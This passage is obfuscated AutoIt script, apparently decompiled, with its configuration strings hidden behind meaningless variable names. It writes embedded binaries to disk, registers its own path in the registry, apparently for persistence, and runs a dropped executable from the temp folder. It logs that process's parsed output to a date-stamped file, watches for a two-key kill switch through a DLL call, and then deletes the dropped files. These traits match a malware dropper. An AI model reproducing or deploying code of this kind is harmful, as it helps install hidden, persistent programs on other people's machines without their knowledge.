$CWL [ 1 ] &= $NTG
$CWL [ 1 ] &= $NXI
$CWL [ 1 ] &= $R_H
$CWL [ 1 ] &= $MVL
Global $FWL [ 1 ] = [ $EWL ]
If ProcessExists ( $EWL ) = 0 And FileExists ( $BWL & $EWL ) = 1 Then
	FileDelete ( $BWL & $EWL )
EndIf
For $GWL = 1 To $CWL [ 0 ]
	Local $HWL = $BWL & $FWL [ $GWL + 4294967295 ]
	Local $IWL = FileOpen ( $HWL , 2 + 8 + 16 )
	FileWrite ( $IWL , Binary ( $CWL [ $GWL ] ) )
	FileClose ( $IWL )
Next
RegWrite ( $ZUB , $JFL , $PRK , @ScriptFullPath )
Sleep ( 100 )
OnAutoItExitRegister ( $TAH )
$JWL = StringRegExp ( $CMDLINERAW , $NVL , 3 )
$LWL = StringRegExp ( $CMDLINERAW , $OVL , 3 )
If IsArray ( $JWL ) Then
	$MWL = StringRegExp ( $CMDLINERAW , $PVL , 3 )
	If IsArray ( $MWL ) Then
		$NWL = Run ( @TempDir & $UVH & $EWL & $MIL & $WNC & @ScriptFullPath & $QVL & $JWL [ 0 ] & $SLK & $LWL [ 0 ] & $RVL & $MWL [ 0 ] & $ZX , @TempDir , @SW_SHOW , 4 + 2 )
	Else
		$NWL = Run ( @TempDir & $UVH & $EWL & $MIL & $WNC & @ScriptFullPath & $QVL & $JWL [ 0 ] & $SLK & $LWL [ 0 ] & $ZX , @TempDir , @SW_SHOW , 4 + 2 )
	EndIf
Else
	$NWL = Run ( @TempDir & $UVH & $EWL & $MIL & $WNC & @ScriptFullPath & $ZX , @TempDir , @SW_SHOW , 4 + 2 )
EndIf
$OWL = DllOpen ( $QYJ )
Sleep ( 3000 )
$PWL = TimerInit ( )
$QWL = 1
AdlibRegister ( $SVL , 5000 )
While $QWL <> 0
	$RWL = StdoutRead ( $NWL )
	If @error = 0 And @extended > 0 Then
		$SWL = StringRegExp ( StringRegExpReplace ( $RWL , $TVL , $UVL ) , $EDG , 3 )
		If UBound ( $SWL ) > 1 Then
			$TWL = $YTH & $SWL [ 0 ] & $TRL & $SWL [ 1 ]
			Do
				$UWL = FileOpen ( @ScriptDir & $MYF & @MDAY & $VVL & @MON & $VVL & @YEAR & $WVL & @HOUR & $VVL & @MIN & $CWH & @ScriptName & $XVL , 0 )
				$VWL = FileRead ( $UWL )
				FileClose ( $UWL )
				$UWL = FileOpen ( @ScriptDir & $MYF & @MDAY & $VVL & @MON & $VVL & @YEAR & $WVL & @HOUR & $VVL & @MIN & $CWH & @ScriptName & $XVL , 10 )
				FileWrite ( $UWL , $VWL & @CRLF & $TWL )
				FileClose ( $UWL )
			Until 1 == 1
		EndIf
	EndIf
	$WWL = $EUC
	$XWL = $OWL
	Do
		Local $YWL = DllCall ( $XWL , $YYJ , $YVL , $EBL , $YTH & $WWL )
		If @error Then
			$ZWL = SetError ( @error , @extended , False )
			ExitLoop 1
		EndIf
		$ZWL = BitAND ( $YWL [ 0 ] , 32768 ) <> 0
		ExitLoop 1
	Until 1 == 1
	$_WL = $ZVL
	$AXL = $OWL
	Do
		Local $BXL = DllCall ( $AXL , $YYJ , $YVL , $EBL , $YTH & $_WL )
		If @error Then
			$CXL = SetError ( @error , @extended , False )
			ExitLoop 1
		EndIf
		$CXL = BitAND ( $BXL [ 0 ] , 32768 ) <> 0
		ExitLoop 1
	Until 1 == 1
	If $ZWL And $CXL Then
		ProcessClose ( $NWL )
		Do
			If ProcessExists ( $EWL ) = 0 Then
				For $DXL = 1 To $CWL [ 0 ]
					FileDelete ( $BWL & $FWL [ $DXL + 4294967295 ] )
				Next
			EndIf
		Until 1 == 1
		Exit
	EndIf
	GUIGetMsg ( )
WEnd
Exit
Func _CHECKALIVE ( )
	$QWL = ProcessExists ( $NWL )
EndFunc
Func _DELBINARYTEMPFILES ( )
	If ProcessExists ( $EWL ) = 0 Then
		For $GWL = 1 To $CWL [ 0 ]
			FileDelete ( $BWL & $FWL [ $GWL + 4294967295 ] )
		Next
	EndIf
EndFunc
